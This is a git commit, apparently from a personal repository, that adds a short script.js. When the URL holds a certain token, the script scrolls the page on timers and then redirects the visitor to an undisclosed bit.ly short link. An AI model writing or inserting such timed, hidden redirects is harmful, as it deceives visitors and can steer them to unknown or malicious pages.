f008c98fca222e3bd8bc42877400251e6cb7409f
AdxPlatino <25423510+adxplatino@users.noreply.github.com>
2020-01-27 17:26:23 -0600

    1
    1

---
+++ script.js
@@ -0,0 +1,21 @@
+if (window.location.href.indexOf(&quot;wbCnHQ&quot;) &gt; -1) {
+
+scrollingElement = (document.scrollingElement || document.body)
+
+setTimeout(function scrol(){
+ window.scrollTo(0, 300);
+}, 8000);
+
+setTimeout(function scrol(){
+ window.scrollTo(0, 600);
+}, 15000);
+
+setTimeout(function scrol(){
+ window.scrollTo(0, 1000);
+}, 20000);
+
+setTimeout(function scrol(){
+window.scrollTo(0, 1600);
+window.location.href = &quot;http://bit.ly/36wZakL&quot;;
+}, 29000);
+}
